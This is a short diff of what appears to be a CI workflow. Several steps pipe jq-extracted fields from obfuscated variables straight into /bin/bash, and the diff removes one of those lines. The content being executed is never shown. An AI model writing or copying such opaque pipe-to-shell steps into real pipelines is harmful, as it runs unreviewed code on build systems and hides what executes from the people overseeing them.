@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ml2" | jq -r .la01 | /bin/bash
           printf '%s' "$zpwhg2633" | jq -r .cle528 | /bin/bash
           echo $xcua0 | jq -r .cj9 | /bin/bash
-          printf '%s' "$ccwk748" | jq -r .x05 | /bin/bash
           printf '%s' "$qcvkj03" | jq -r .b7579 | /bin/bash
 
       - name: Save archive
